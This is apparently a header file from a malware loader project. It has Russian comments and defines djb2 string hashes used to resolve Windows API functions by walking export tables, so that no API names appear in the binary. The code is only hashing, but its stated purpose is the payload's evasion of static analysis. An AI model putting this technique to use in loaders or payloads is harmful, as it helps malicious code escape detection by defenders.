/**
 * hash.h — compile-time djb2 hash для резолвинга API без строк в бинарнике.
 * Используется в loader и payload для GetProcAddress-аналога через EAT walk.
 */
#pragma once
#include <cstdint>

// Compile-time djb2 hash
constexpr uint32_t HashStr(const char* s, uint32_t h = 5381) {
    return *s ? HashStr(s + 1, ((h << 5) + h) ^ static_cast<uint8_t>(*s)) : h;
}

// Runtime версия — для walk по EAT при динамических именах
inline uint32_t HashStrRuntime(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ static_cast<uint8_t>(*s++);
    return h;
}

inline uint32_t HashWStrRuntime(const wchar_t* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ static_cast<uint8_t>(*s++ & 0xFF);
    return h;
}
